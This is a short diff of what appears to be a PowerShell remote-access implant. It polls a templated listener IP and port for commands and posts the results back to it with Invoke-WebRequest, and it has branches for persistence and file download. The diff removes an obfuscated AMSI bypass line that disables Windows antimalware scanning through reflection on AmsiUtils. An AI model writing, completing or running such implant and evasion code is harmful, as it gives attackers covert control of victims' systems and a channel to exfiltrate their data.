@@ -1,5 +1,3 @@
-[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
-
 $ip   = "{{LISTENER_IP}}"
 $port = "{{LISTENER_PORT}}"
 $sleep_time = 3
@@ -61,7 +59,6 @@ for (;;){
             $data = @{result = "$res"}
                         
             Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
-        
         } elseif ($command -eq "persist"){
 	        exit # TODO: persistence
         } elseif ($command -eq "download"){
